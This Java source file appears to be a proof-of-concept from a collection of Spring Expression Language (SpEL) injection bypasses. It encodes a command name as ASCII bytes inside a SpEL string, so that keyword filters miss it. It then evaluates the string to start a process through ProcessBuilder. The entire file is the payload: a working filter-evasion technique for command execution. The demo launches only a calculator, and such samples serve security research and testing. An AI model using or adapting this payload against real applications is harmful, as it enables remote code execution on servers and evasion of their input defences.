package PoCAndBypass.NormalBypass;

import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;


// 用 Ascii 码进行 bypass
public class AsciiBypass {
    public static void main(String[] args) {
        String spel = "new java.lang.ProcessBuilder(new java.lang.String(new byte[]{99,97,108,99})).start()";
        ExpressionParser parser = new SpelExpressionParser();
        Expression expression = parser.parseExpression(spel);
        System.out.println(expression.getValue());
    }
}
